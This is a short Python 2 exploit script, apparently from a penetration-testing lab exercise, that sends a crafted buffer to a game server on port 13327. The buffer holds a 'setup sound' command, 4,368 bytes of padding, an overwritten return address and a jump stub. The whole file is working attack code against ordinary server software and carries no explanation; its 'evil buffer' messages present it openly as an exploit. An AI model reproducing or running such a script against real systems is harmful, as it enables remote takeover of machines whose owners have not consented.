#!/usr/bin/python
import socket

#host="192.168.0.32"
host="172.16.99.84"
padding="\x41" * 4368
eip="\x96\x45\x13\x08"
#first_stage="\x83\xC0\x0C\xFF\xE0\x90\x90"
first_stage="\x08\x07\x1e\x4e\xE0\x90\x90"
buffer="\x11(setup sound " + padding + eip + first_stage + "\x90\x00#"

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."

s.connect((host,13327))
print s.recv(1024)

s.send(buffer)
s.close()

print "[*]Payload Sent !"

